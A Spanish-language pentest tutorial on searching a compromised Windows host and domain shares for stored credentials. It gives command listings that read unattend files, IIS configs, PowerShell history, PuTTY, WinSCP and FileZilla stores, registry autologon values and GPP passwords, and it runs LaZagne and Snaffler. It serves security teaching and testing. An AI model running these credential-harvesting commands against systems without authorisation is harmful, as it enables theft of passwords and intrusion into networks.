# Búsqueda de Credenciales en Windows

Más allá de LSASS y SAM, los sistemas Windows acumulan credenciales en decenas de ubicaciones: archivos de configuración, scripts, bases de datos de aplicaciones, variables de entorno, historial de PowerShell y registros. Una búsqueda sistemática del filesystem suele revelar contraseñas en texto claro que los usuarios y administradores dejan inadvertidamente.

### Búsqueda en el filesystem

#### Comandos básicos (CMD)

```cmd
# Buscar archivos con "password" en el nombre
dir /s /b *password* *pass* *cred* *secret* 2>nul

# Buscar contenido con términos sensibles en archivos de texto
findstr /si "password" *.txt *.xml *.ini *.config *.cfg *.ps1 *.bat *.cmd

# Buscar en todo el disco
findstr /spin "password" *.*
```

#### PowerShell

```powershell
# Buscar recursivamente
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.xml,*.ini,*.config,*.ps1,*.bat |
  Select-String -Pattern "password","passwd","pwd","secret","credential" |
  Select-Object Path, LineNumber, Line

# Buscar archivos por nombre
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*pass*"
```

### Ubicaciones de alto valor

#### Archivos de automatización y despliegue

Los archivos de unattended install de Windows con frecuencia contienen la contraseña del administrador local en texto claro o Base64:

```cmd
# Buscar archivos unattended
dir /s /b C:\unattend.xml C:\Panther\unattend.xml C:\Windows\system32\sysprep\unattend.xml

# Contenido típico a buscar
<AutoLogon>
  <Password><Value>P4ssw0rd!</Value></Password>
```

#### Configuraciones de IIS

```cmd
C:\inetpub\wwwroot\web.config       # connection strings, API keys
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
```

```powershell
Get-ChildItem C:\inetpub -Recurse -Filter "web.config" |
  Select-String -Pattern "password|connectionString|pwd"
```

#### Historial de PowerShell

```powershell
# El historial de PS puede contener comandos con credenciales en claro
Get-Content C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Archivos de configuración de herramientas

```cmd
# Putty — sesiones guardadas (pueden incluir usuario/contraseña)
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

# WinSCP — contraseñas de sesiones (cifradas pero crackeables)
reg query HKCU\Software\Martin Prikryl\WinSCP 2\Sessions /s

# FileZilla
type C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml
type C:\Users\*\AppData\Roaming\FileZilla\sitemanager.xml
```

#### Registro de Windows

```cmd
# Búsqueda de contraseñas en el registro
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Autologon — contraseña del usuario en texto claro si está configurado
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Scripts y configuraciones de red

```cmd
dir /s /b C:\Scripts\*.bat C:\Scripts\*.ps1 C:\Scripts\*.cmd
dir /s /b \\dc01\NETLOGON\*.bat \\dc01\SYSVOL\*.xml
```

#### GPP Passwords (Group Policy Preferences)

Un clásico: las contraseñas en GPP se cifran con AES-256 pero con una clave publicada por Microsoft. `Get-GPPPassword` o `gpp-decrypt` las descifran trivialmente:

```bash
# Desde Linux con Impacket/NetExec
netexec smb dc01.dominio.local -u user -p pass -M gpp_password

# Desde Windows con PowerSploit
Get-GPPPassword
```

### Herramientas automatizadas de búsqueda

#### LaZagne

LaZagne busca contraseñas almacenadas en aplicaciones: navegadores, clientes de correo, bases de datos, VPNs, gestores de contraseñas, etc.:

```cmd
lazagne.exe all
lazagne.exe browsers
lazagne.exe sysadmin
```

#### Snaffler

Orientado a redes AD: escanea shares accesibles buscando archivos con contenido sensible:

```cmd
Snaffler.exe -s -d dominio.local -o snaffler_output.log
```

> En un pentest interno, combinar Snaffler sobre shares de red con una búsqueda local con LaZagne sobre el host comprometido captura la mayoría de credenciales hardcodeadas en el entorno.

> Revisar siempre los directorios de los usuarios administradores y del equipo de IT/sysadmin — sus estaciones de trabajo tienden a acumular más credenciales que las de usuarios estándar.
